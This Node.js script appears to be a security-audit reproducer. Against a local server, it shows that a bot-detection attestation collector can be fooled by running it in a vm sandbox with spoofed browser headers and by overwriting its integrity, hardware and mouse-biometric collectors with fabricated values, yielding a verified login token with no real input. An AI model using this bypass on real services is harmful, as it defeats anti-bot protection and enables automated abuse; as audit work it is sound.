"use strict";
// Local-only audit reproducer. Uses an unmodified HTTP-served collector and real
// scratchpad work. Does not read server sessions, keys or expected VM state.
const crypto = require("node:crypto");
const vm = require("node:vm");
const { createServer } = require("./attestation/server");

async function main() {
  const server = createServer();
  await new Promise(resolve => server.listen(0, "127.0.0.1", resolve));
  const origin = `http://127.0.0.1:${server.address().port}`;
  const headers = { "user-agent": "Mozilla/5.0 Chrome/130.0", "accept-language": "en-US",
    "sec-ch-ua": '"Chromium";v="130"', "sec-ch-ua-platform": '"Windows"', "sec-ch-ua-mobile": "?0",
    "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors" };
  let blob, result;
  class LocalWorker {
    constructor() {
      this.events = {};
      this.ready = blob.text().then(source => {
        vm.runInNewContext(source, { TextEncoder, performance,
          self: { addEventListener: (_type, fn) => { this.mine = fn; },
            postMessage: data => this.events.message?.({ data }) } });
      });
    }
    addEventListener(type, fn) { this.events[type] = fn; }
    terminate() {}
    postMessage(data) { this.ready.then(() => this.mine({ data })); }
  }
  try {
    const response = await fetch(origin + "/collector.js", { headers });
    if (!response.ok) throw new Error("collector request failed");
    const bundle = await response.text();
    const subtle = {};
    for (const name of ["encrypt", "decrypt", "importKey", "generateKey", "deriveBits", "exportKey", "digest"])
      subtle[name] = crypto.webcrypto.subtle[name].bind(crypto.webcrypto.subtle);
    const context = vm.createContext({
      crypto: { subtle, getRandomValues: crypto.webcrypto.getRandomValues.bind(crypto.webcrypto) },
      TextEncoder, TextDecoder, AbortController, atob, btoa, performance, Blob, Worker: LocalWorker,
      setTimeout, clearTimeout, setInterval, clearInterval,
      URL: { createObjectURL(value) { blob = value; return "blob:local-audit"; }, revokeObjectURL() {} },
      addEventListener() {}, removeEventListener() {},
      navigator: { [Symbol.toStringTag]: "Navigator" },
      document: { createElement: () => ({ getContext: () => ({ fillRect() {} }) }) },
      fetch: async (url, options) => {
        const res = await fetch(origin + url, { ...options, headers: { ...headers, ...options.headers } });
        result = await res.clone().json(); return res;
      },
    });
    context.window = context;
    vm.runInContext(bundle, context);
    // These exported collector objects are mutable. No input events are sent.
    context.RuntimeIntegrity = { collect: () => ({ confidence_penalty: 0,
      anomalies: [], receiverErrorText: "TypeError: Illegal invocation" }) };
    context.HardwareConsistency = { collect: async () => ({ profile: {
      userAgent: headers["user-agent"], hardwareConcurrency: 8 } }) };
    context.Kinematics = { getBiometricVector: () => ({ eventCounts: { mousemove: 80 },
      mouse: { pointCount: 45, entropyRatio: 0.92 } }) };
    const token = await context.__attestation.execute("login");
    const verified = await fetch(origin + "/verify", { method: "POST",
      headers: { ...headers, "content-type": "application/json" },
      body: JSON.stringify({ token, action: "login", minScore: 0.70 }) });
    const verification = await verified.json();
    if (result.status !== "passed" || !verification.valid) throw new Error("Bypass not reproduced");
    console.log(JSON.stringify({ status: result.status, score: result.score,
      tokenVerified: verification.valid, realInputEvents: 0, browserUsed: false, visualSolved: false }));
  } finally { await new Promise(resolve => server.close(resolve)); }
}
main().catch(error => { console.error(error); process.exitCode = 1; });
